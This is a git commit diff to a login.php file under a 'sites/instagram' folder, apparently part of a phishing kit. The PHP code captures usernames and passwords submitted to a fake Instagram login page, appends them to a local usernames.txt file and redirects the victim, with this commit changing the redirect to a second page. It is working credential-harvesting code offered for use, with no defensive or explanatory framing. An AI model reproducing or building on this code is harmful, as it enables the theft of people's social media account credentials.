e7b74c3af29292476afa71911783b840c414e3f4
akhilesh807802 <62746355+akhilesh807802@users.noreply.github.com>
2020-03-27 22:11:01 +0530

    Update login.php

--- sites/instagram/login.php
+++ sites/instagram/login.php
@@ -1,5 +1,5 @@
-<?php
+ <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: ./login2.html');
 exit();
